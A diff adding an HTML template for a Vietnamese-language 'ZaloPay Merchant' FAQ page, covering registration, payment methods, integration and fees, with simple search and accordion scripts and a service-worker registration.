@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#0066cc">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="default">
+    <meta name="apple-mobile-web-app-title" content="ZaloPay Merchant">
+    <link rel="manifest" href="/manifest.json">
+    <link rel="icon" type="image/png" href="/images/zalopay-merchant-icon.png">
+    <link rel="apple-touch-icon" href="/images/zalopay-merchant-app-icon.png">
+    <title>Câu hỏi thường gặp - ZaloPay Merchant</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <link href="{{ url_for('static', filename='merchant/css/style.css') }}" rel="stylesheet">
+</head>
+<body>
+    <!-- Header -->
+    <header class="navbar navbar-expand-lg navbar-light bg-white shadow-sm">
+        <div class="container">
+            <a class="navbar-brand" href="{{ url_for('merchant.index') }}">
+                <img src="https://stc-zaloprofile.zdn.vn/pc/v1/images/logo_zalopay.png" alt="ZaloPay" height="40">
+            </a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav ms-auto">
+                    <li class="nav-item">
+                        <a class="nav-link" href="{{ url_for('merchant.solutions') }}">Giải pháp</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="{{ url_for('merchant.index') }}#benefits">Lợi ích</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link active" href="#">FAQ</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="btn btn-primary ms-2" href="{{ url_for('merchant.register_form') }}">Đăng ký ngay</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="py-5 bg-primary text-white">
+        <div class="container">
+            <div class="row justify-content-center">
+                <div class="col-lg-8 text-center">
+                    <h1 class="display-4 mb-3">Câu hỏi thường gặp</h1>
+                    <p class="lead">Tìm câu trả lời cho những thắc mắc phổ biến về dịch vụ ZaloPay Merchant</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Search Section -->
+    <section class="py-4 bg-light">
+        <div class="container">
+            <div class="row justify-content-center">
+                <div class="col-lg-6">
+                    <div class="input-group">
+                        <input type="text" class="form-control" id="faqSearch" placeholder="Tìm kiếm câu hỏi...">
+                        <button class="btn btn-primary" type="button">
+                            <i class="fas fa-search"></i>
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- FAQ Categories -->
+    <section class="py-5">
+        <div class="container">
+            <div class="row justify-content-center">
+                <div class="col-lg-10">
+                    <!-- Category Tabs -->
+                    <ul class="nav nav-pills justify-content-center mb-5" id="faqTabs">
+                        <li class="nav-item">
+                            <button class="nav-link active" data-bs-toggle="pill" data-bs-target="#general">Tổng quan</button>
+                        </li>
+                        <li class="nav-item">
+                            <button class="nav-link" data-bs-toggle="pill" data-bs-target="#registration">Đăng ký</button>
+                        </li>
+                        <li class="nav-item">
+                            <button class="nav-link" data-bs-toggle="pill" data-bs-target="#payment">Thanh toán</button>
+                        </li>
+                        <li class="nav-item">
+                            <button class="nav-link" data-bs-toggle="pill" data-bs-target="#technical">Kỹ thuật</button>
+                        </li>
+                        <li class="nav-item">
+                            <button class="nav-link" data-bs-toggle="pill" data-bs-target="#fees">Phí và chi phí</button>
+                        </li>
+                    </ul>
+
+                    <div class="tab-content">
+                        <!-- General FAQ -->
+                        <div class="tab-pane fade show active" id="general">
+                            <div class="accordion" id="generalAccordion">
+                                <div class="accordion-item">
+                                    <h2 class="accordion-header">
+                                        <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#general1">
+                                            ZaloPay Merchant là gì?
+                                        </button>
+                                    </h2>
+                                    <div id="general1" class="accordion-collapse collapse show" data-bs-parent="#generalAccordion">
+                                        <div class="accordion-body">
+                                            ZaloPay Merchant là nền tảng thanh toán dành cho các doanh nghiệp, cửa hàng, 
+                                            cho phép chấp nhận thanh toán từ khách hàng thông qua ZaloPay và các phương thức thanh toán khác. 
+                                            Hệ thống cung cấp nhiều giải pháp từ thanh toán tại quầy đến thanh toán trực tuyến.
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div class="accordion-item">
+                                    <h2 class="accordion-header">
+                                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#general2">
+                                            Những loại hình doanh nghiệp nào có thể sử dụng ZaloPay?
+                                        </button>
+                                    </h2>
+                                    <div id="general2" class="accordion-collapse collapse" data-bs-parent="#generalAccordion">
+                                        <div class="accordion-body">
+                                            ZaloPay phù hợp với mọi loại hình kinh doanh:
+                                            <ul class="mt-2">
+                                                <li><strong>Bán lẻ:</strong> Siêu thị, cửa hàng tiện lợi, cửa hàng thời trang</li>
+                                                <li><strong>Ăn uống:</strong> Nhà hàng, quán ăn, cà phê, trà sữa</li>
+                                                <li><strong>Dịch vụ:</strong> Spa, salon, gym, karaoke</li>
+                                                <li><strong>Trực tuyến:</strong> Website, ứng dụng thương mại điện tử</li>
+                                                <li><strong>Chuyên biệt:</strong> Căn tin, bãi đỗ xe, trường học</li>
+                                            </ul>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div class="accordion-item">
+                                    <h2 class="accordion-header">
+                                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#general3">
+                                            ZaloPay có hoạt động ở những khu vực nào?
+                                        </button>
+                                    </h2>
+                                    <div id="general3" class="accordion-collapse collapse" data-bs-parent="#generalAccordion">
+                                        <div class="accordion-body">
+                                            ZaloPay hiện hoạt động trên toàn lãnh thổ Việt Nam với hệ thống hỗ trợ 24/7. 
+                                            Chúng tôi có văn phòng tại các thành phố lớn và đội ngũ hỗ trợ kỹ thuật toàn quốc.
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Registration FAQ -->
+                        <div class="tab-pane fade" id="registration">
+                            <div class="accordion" id="registrationAccordion">
+                                <div class="accordion-item">
+                                    <h2 class="accordion-header">
+                                        <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#reg1">
+                                            Chi phí đăng ký tài khoản ZaloPay Merchant là bao nhiêu?
+                                        </button>
+                                    </h2>
+                                    <div id="reg1" class="accordion-collapse collapse show" data-bs-parent="#registrationAccordion">
+                                        <div class="accordion-body">
+                                            <strong>Hoàn toàn miễn phí!</strong> ZaloPay không thu bất kỳ khoản phí nào trong quá trình 
+                                            đăng ký tài khoản và tích hợp giải pháp thanh toán. Bạn chỉ trả phí giao dịch khi có 
+                                            khách hàng thanh toán thành công.
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div class="accordion-item">
+                                    <h2 class="accordion-header">
+                                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#reg2">
+                                            Tài liệu cần thiết khi đăng ký là gì?
+                                        </button>
+                                    </h2>
+                                    <div id="reg2" class="accordion-collapse collapse" data-bs-parent="#registrationAccordion">
+                                        <div class="accordion-body">
+                                            <strong>Đối với cá nhân/hộ kinh doanh:</strong>
+                                            <ul>
+                                                <li>CMND/CCCD của chủ cửa hàng</li>
+                                                <li>Giấy phép kinh doanh (nếu có)</li>
+                                                <li>Hình ảnh cửa hàng/địa điểm kinh doanh</li>
+                                                <li>Thông tin tài khoản ngân hàng</li>
+                                            </ul>
+                                            <strong>Đối với doanh nghiệp:</strong>
+                                            <ul>
+                                                <li>Giấy chứng nhận đăng ký doanh nghiệp</li>
+                                                <li>Giấy phép ngành nghề (nếu có)</li>
+                                                <li>CMND/CCCD người đại diện pháp luật</li>
+                                                <li>Thông tin tài khoản ngân hàng doanh nghiệp</li>
+                                            </ul>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div class="accordion-item">
+                                    <h2 class="accordion-header">
+                                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#reg3">
+                                            Thời gian duyệt hồ sơ là bao lâu?
+                                        </button>
+                                    </h2>
+                                    <div id="reg3" class="accordion-collapse collapse" data-bs-parent="#registrationAccordion">
+                                        <div class="accordion-body">
+                                            <ul>
+                                                <li><strong>Cá nhân/Hộ kinh doanh:</strong> 5-15 phút (tự động duyệt)</li>
+                                                <li><strong>Doanh nghiệp:</strong> 24-48 giờ làm việc</li>
+                                                <li><strong>Trường hợp phức tạp:</strong> 3-5 ngày làm việc</li>
+                                            </ul>
+                                            Chúng tôi sẽ thông báo kết quả qua email và SMS đã đăng ký.
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Payment FAQ -->
+                        <div class="tab-pane fade" id="payment">
+                            <div class="accordion" id="paymentAccordion">
+                                <div class="accordion-item">
+                                    <h2 class="accordion-header">
+                                        <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#pay1">
+                                            Khách hàng có thể thanh toán bằng những phương thức nào?
+                                        </button>
+                                    </h2>
+                                    <div id="pay1" class="accordion-collapse collapse show" data-bs-parent="#paymentAccordion">
+                                        <div class="accordion-body">
+                                            ZaloPay hỗ trợ đa dạng phương thức thanh toán:
+                                            <ul>
+                                                <li><strong>Ví ZaloPay:</strong> Thanh toán từ số dư ví</li>
+                                                <li><strong>Thẻ ngân hàng:</strong> Visa, Mastercard, JCB</li>
+                                                <li><strong>Chuyển khoản:</strong> Internet Banking, ATM</li>
+                                                <li><strong>Ví điện tử khác:</strong> MoMo, ViettelPay (thông qua VietQR)</li>
+                                                <li><strong>Apple Pay:</strong> Cho người dùng iOS</li>
+                                            </ul>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div class="accordion-item">
+                                    <h2 class="accordion-header">
+                                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#pay2">
+                                            Thời gian nhận tiền về tài khoản là bao lâu?
+                                        </button>
+                                    </h2>
+                                    <div id="pay2" class="accordion-collapse collapse" data-bs-parent="#paymentAccordion">
+                                        <div class="accordion-body">
+                                            <ul>
+                                                <li><strong>Thanh toán từ ví ZaloPay:</strong> Realtime (ngay lập tức)</li>
+                                                <li><strong>Thẻ ngân hàng:</strong> T+1 (ngày làm việc tiếp theo)</li>
+                                                <li><strong>Chuyển khoản ngân hàng:</strong> T+1 (ngày làm việc tiếp theo)</li>
+                                            </ul>
+                                            <small class="text-muted">
+                                                T+1 có nghĩa là tiền sẽ về tài khoản vào ngày làm việc tiếp theo sau ngày giao dịch.
+                                            </small>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div class="accordion-item">
+                                    <h2 class="accordion-header">
+                                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#pay3">
+                                            Có giới hạn số tiền giao dịch không?
+                                        </button>
+                                    </h2>
+                                    <div id="pay3" class="accordion-collapse collapse" data-bs-parent="#paymentAccordion">
+                                        <div class="accordion-body">
+                                            <strong>Giới hạn mặc định:</strong>
+                                            <ul>
+                                                <li><strong>Giao dịch tối thiểu:</strong> 1,000 VNĐ</li>
+                                                <li><strong>Giao dịch tối đa:</strong> 50,000,000 VNĐ/lần</li>
+                                                <li><strong>Tổng giao dịch/ngày:</strong> 200,000,000 VNĐ</li>
+                                            </ul>
+                                            <strong>Nâng hạn mức:</strong> Liên hệ hotline để được hỗ trợ nâng hạn mức dựa trên lịch sử giao dịch.
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Technical FAQ -->
+                        <div class="tab-pane fade" id="technical">
+                            <div class="accordion" id="technicalAccordion">
+                                <div class="accordion-item">
+                                    <h2 class="accordion-header">
+                                        <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#tech1">
+                                            Tôi có cần kiến thức lập trình để tích hợp ZaloPay không?
+                                        </button>
+                                    </h2>
+                                    <div id="tech1" class="accordion-collapse collapse show" data-bs-parent="#technicalAccordion">
+                                        <div class="accordion-body">
+                                            <strong>Không bắt buộc!</strong> ZaloPay cung cấp nhiều giải pháp:
+                                            <ul>
+                                                <li><strong>Mã QR tĩnh:</strong> Không cần kỹ thuật, chỉ cần in và dán</li>
+                                                <li><strong>Plugin WordPress/Shopify:</strong> Cài đặt đơn giản trong vài click</li>
+                                                <li><strong>API tích hợp:</strong> Dành cho các website/app tùy chỉnh</li>
+                                            </ul>
+                                            Chúng tôi có đội ngũ kỹ thuật hỗ trợ miễn phí quá trình tích hợp.
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div class="accordion-item">
+                                    <h2 class="accordion-header">
+                                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#tech2">
+                                            ZaloPay có cung cấp API documentation không?
+                                        </button>
+                                    </h2>
+                                    <div id="tech2" class="accordion-collapse collapse" data-bs-parent="#technicalAccordion">
+                                        <div class="accordion-body">
+                                            Có! Chúng tôi cung cấp:
+                                            <ul>
+                                                <li><strong>API Documentation:</strong> Hướng dẫn chi tiết từng bước</li>
+                                                <li><strong>SDK:</strong> Thư viện cho PHP, Node.js, Java, .NET</li>
+                                                <li><strong>Postman Collection:</strong> Test API dễ dàng</li>
+                                                <li><strong>Sandbox Environment:</strong> Môi trường test miễn phí</li>
+                                                <li><strong>Code Examples:</strong> Ví dụ mã nguồn thực tế</li>
+                                            </ul>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div class="accordion-item">
+                                    <h2 class="accordion-header">
+                                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#tech3">
+                                            Làm thế nào để test tích hợp trước khi go-live?
+                                        </button>
+                                    </h2>
+                                    <div id="tech3" class="accordion-collapse collapse" data-bs-parent="#technicalAccordion">
+                                        <div class="accordion-body">
+                                            ZaloPay cung cấp môi trường Sandbox hoàn toàn miễn phí:
+                                            <ol>
+                                                <li>Đăng ký tài khoản developer</li>
+                                                <li>Nhận API key cho môi trường test</li>
+                                                <li>Sử dụng test data để mô phỏng giao dịch</li>
+                                                <li>Kiểm tra webhook và callback</li>
+                                                <li>Chuyển sang môi trường production khi sẵn sàng</li>
+                                            </ol>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Fees FAQ -->
+                        <div class="tab-pane fade" id="fees">
+                            <div class="accordion" id="feesAccordion">
+                                <div class="accordion-item">
+                                    <h2 class="accordion-header">
+                                        <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#fee1">
+                                            Phí giao dịch của ZaloPay là bao nhiêu?
+                                        </button>
+                                    </h2>
+                                    <div id="fee1" class="accordion-collapse collapse show" data-bs-parent="#feesAccordion">
+                                        <div class="accordion-body">
+                                            <strong>Phí cạnh tranh nhất thị trường:</strong>
+                                            <table class="table table-bordered mt-2">
+                                                <thead>
+                                                    <tr>
+                                                        <th>Phương thức thanh toán</th>
+                                                        <th>Phí giao dịch</th>
+                                                    </tr>
+                                                </thead>
+                                                <tbody>
+                                                    <tr>
+                                                        <td>Ví ZaloPay</td>
+                                                        <td>1.5% + 0 VNĐ</td>
+                                                    </tr>
+                                                    <tr>
+                                                        <td>Thẻ nội địa</td>
+                                                        <td>1.8% + 2,000 VNĐ</td>
+                                                    </tr>
+                                                    <tr>
+                                                        <td>Thẻ quốc tế</td>
+                                                        <td>3.0% + 2,000 VNĐ</td>
+                                                    </tr>
+                                                    <tr>
+                                                        <td>Chuyển khoản</td>
+                                                        <td>0.9% + 0 VNĐ</td>
+                                                    </tr>
+                                                </tbody>
+                                            </table>
+                                            <small class="text-muted">
+                                                Phí có thể thương lượng dựa trên volume giao dịch hàng tháng.
+                                            </small>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div class="accordion-item">
+                                    <h2 class="accordion-header">
+                                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#fee2">
+                                            Có phí ẩn nào khác không?
+                                        </button>
+                                    </h2>
+                                    <div id="fee2" class="accordion-collapse collapse" data-bs-parent="#feesAccordion">
+                                        <div class="accordion-body">
+                                            <strong>Hoàn toàn minh bạch!</strong> ZaloPay cam kết:
+                                            <ul>
+                                                <li><i class="fas fa-check text-success me-2"></i>Không phí setup</li>
+                                                <li><i class="fas fa-check text-success me-2"></i>Không phí duy trì hàng tháng</li>
+                                                <li><i class="fas fa-check text-success me-2"></i>Không phí hủy hợp đồng</li>
+                                                <li><i class="fas fa-check text-success me-2"></i>Không phí chuyển tiền về ngân hàng</li>
+                                                <li><i class="fas fa-check text-success me-2"></i>Không phí refund/hoàn tiền</li>
+                                            </ul>
+                                            Bạn chỉ trả phí khi có giao dịch thành công!
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div class="accordion-item">
+                                    <h2 class="accordion-header">
+                                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#fee3">
+                                            Làm thế nào để được giảm phí giao dịch?
+                                        </button>
+                                    </h2>
+                                    <div id="fee3" class="accordion-collapse collapse" data-bs-parent="#feesAccordion">
+                                        <div class="accordion-body">
+                                            ZaloPay có chương trình ưu đãi dựa trên volume:
+                                            <ul>
+                                                <li><strong>Volume > 100 triệu/tháng:</strong> Giảm 10% phí</li>
+                                                <li><strong>Volume > 500 triệu/tháng:</strong> Giảm 20% phí</li>
+                                                <li><strong>Volume > 1 tỷ/tháng:</strong> Đàm phán riêng</li>
+                                            </ul>
+                                            <strong>Ưu đãi khác:</strong>
+                                            <ul>
+                                                <li>Miễn phí 3 tháng đầu cho doanh nghiệp mới</li>
+                                                <li>Cashback cho các ngành nghề ưu tiên</li>
+                                                <li>Ưu đãi đặc biệt cho đối tác chiến lược</li>
+                                            </ul>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Contact Support -->
+    <section class="py-5 bg-primary text-white">
+        <div class="container">
+            <div class="row justify-content-center">
+                <div class="col-lg-8 text-center">
+                    <h2 class="mb-3">Không tìm thấy câu trả lời?</h2>
+                    <p class="lead mb-4">Đội ngũ hỗ trợ của chúng tôi luôn sẵn sàng giúp đỡ bạn 24/7</p>
+                    <div class="row justify-content-center">
+                        <div class="col-md-4 mb-3">
+                            <div class="card bg-white text-dark">
+                                <div class="card-body text-center">
+                                    <i class="fas fa-phone fa-2x text-primary mb-2"></i>
+                                    <h5>Hotline</h5>
+                                    <p class="mb-2">1900 561 456</p>
+                                    <small class="text-muted">24/7 - Miễn phí</small>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-4 mb-3">
+                            <div class="card bg-white text-dark">
+                                <div class="card-body text-center">
+                                    <i class="fas fa-envelope fa-2x text-primary mb-2"></i>
+                                    <h5>Email</h5>
+                                    <p class="mb-2">support@zalopay.vn</p>
+                                    <small class="text-muted">Phản hồi trong 2 giờ</small>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-4 mb-3">
+                            <div class="card bg-white text-dark">
+                                <div class="card-body text-center">
+                                    <i class="fab fa-facebook-messenger fa-2x text-primary mb-2"></i>
+                                    <h5>Live Chat</h5>
+                                    <p class="mb-2">Trò chuyện trực tiếp</p>
+                                    <small class="text-muted">Online: 8:00 - 22:00</small>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer py-5 bg-dark text-white">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-4 mb-4">
+                    <img src="https://stc-zaloprofile.zdn.vn/pc/v1/images/logo_zalopay.png" alt="ZaloPay" height="40" class="mb-3">
+                    <p>Câu hỏi thường gặp về dịch vụ ZaloPay Merchant</p>
+                </div>
+                <div class="col-lg-2 col-md-6 mb-4">
+                    <h5>Liên kết nhanh</h5>
+                    <ul class="list-unstyled">
+                        <li><a href="{{ url_for('merchant.index') }}" class="text-light">Trang chủ</a></li>
+                        <li><a href="{{ url_for('merchant.solutions') }}" class="text-light">Giải pháp</a></li>
+                        <li><a href="{{ url_for('merchant.register_form') }}" class="text-light">Đăng ký</a></li>
+                    </ul>
+                </div>
+                <div class="col-lg-2 col-md-6 mb-4">
+                    <h5>Tài liệu</h5>
+                    <ul class="list-unstyled">
+                        <li><a href="#" class="text-light">API Documentation</a></li>
+                        <li><a href="#" class="text-light">Hướng dẫn tích hợp</a></li>
+                        <li><a href="#" class="text-light">SDK Download</a></li>
+                    </ul>
+                </div>
+                <div class="col-lg-4 mb-4">
+                    <h5>Hỗ trợ</h5>
+                    <p>
+                        Hotline: 1900 561 456<br>
+                        Email: support@zalopay.vn<br>
+                        Thời gian: 24/7
+                    </p>
+                </div>
+            </div>
+            <hr class="my-4">
+            <div class="row align-items-center">
+                <div class="col-md-6">
+                    <p class="mb-0">&copy; 2024 ZaloPay. All rights reserved.</p>
+                </div>
+                <div class="col-md-6 text-md-end">
+                    <a href="#" class="text-light me-3">Điều khoản sử dụng</a>
+                    <a href="#" class="text-light">Chính sách bảo mật</a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Scripts -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        // FAQ Search functionality
+        document.getElementById('faqSearch').addEventListener('input', function(e) {
+            const searchTerm = e.target.value.toLowerCase();
+            const accordionItems = document.querySelectorAll('.accordion-item');
+            
+            accordionItems.forEach(item => {
+                const button = item.querySelector('.accordion-button');
+                const body = item.querySelector('.accordion-body');
+                const text = (button.textContent + ' ' + body.textContent).toLowerCase();
+                
+                if (text.includes(searchTerm)) {
+                    item.style.display = 'block';
+                } else {
+                    item.style.display = 'none';
+                }
+            });
+        });
+
+        // Auto-collapse other accordion items when opening one
+        document.querySelectorAll('.accordion-button').forEach(button => {
+            button.addEventListener('click', function() {
+                const targetId = this.getAttribute('data-bs-target');
+                const target = document.querySelector(targetId);
+                
+                // Close other accordions in the same tab
+                const currentAccordion = this.closest('.accordion');
+                currentAccordion.querySelectorAll('.accordion-collapse').forEach(collapse => {
+                    if (collapse.id !== targetId.substring(1)) {
+                        const bsCollapse = bootstrap.Collapse.getInstance(collapse);
+                        if (bsCollapse) {
+                            bsCollapse.hide();
+                        }
+                    }
+                });
+            });
+        });
+    </script>
+    <!-- Service Worker Registration -->
+    <script>
+      if ('serviceWorker' in navigator) {
+        window.addEventListener('load', () => {
+          navigator.serviceWorker.register('/sw.js')
+            .then((registration) => {
+              console.log('Service Worker registered successfully:', registration.scope);
+            })
+            .catch((error) => {
+              console.error('Service Worker registration failed:', error);
+            });
+        });
+      }
+    </script>
+    
+    <!-- Socket.IO Background Support -->
+    <script src="https://cdn.socket.io/4.5.3/socket.io.min.js"></script>
+    <script src="/js/socket-background.js"></script>
+</body>
+</html>
